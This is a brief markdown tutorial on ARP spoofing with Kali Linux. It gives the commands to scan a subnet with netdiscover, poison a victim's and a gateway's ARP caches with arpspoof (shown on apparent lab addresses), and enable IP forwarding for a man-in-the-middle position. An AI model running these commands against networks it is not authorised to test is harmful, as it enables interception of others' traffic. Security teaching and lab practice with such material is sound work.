# Kali Linux ARP Spoofing

In computer networking, [ARP spoofing]('https://en.wikipedia.org/wiki/ARP_spoofing'), ARP cache poisoning, or ARP poison routing, is a technique by which an attacker sends (spoofed) Address Resolution Protocol (ARP) messages onto a local area network.


## ARP
The [Address Resolution Protocol](('https://en.wikipedia.org/wiki/Address_Resolution_Protocol')) (ARP) is a communication protocol used for discovering the link layer address, such as a MAC address, associated with a given internet layer address, typically an IPv4 address. 


Check ARP on Linux/Mac/Win.

```sh
arp -a
```

## Find Default Gateway
Check your default gateway:
```sh
ip route
```

## Scan the Network

-r is for range

```sh
netdiscover -r 10.0.2.0/24
```

## ARP Spoofing

```sh
arpspoof -i INTERFACE -t VICTIM_IP GATEWAY_IP

arpspoof -i INTERFACE -t GATEWAY_IP VICTIM_IP

```

```sh
arpspoof -i eth0 -t 10.0.2.15 10.0.2.1
```

```sh
arpspoof -i eth0 -t 10.0.2.1 10.0.2.15
```

Make sure port forwarding is enabled, as described below.

### Check port forwarding
```sh
sysctl net.ipv4.ip_forward
```

### Enable port forwarding
```sh
sysctl -w net.ipv4.ip_forward=1
```

OR, if that doesn't work:

```sh
echo 1 > /proc/sys/net/ipv4/ip_forward
```
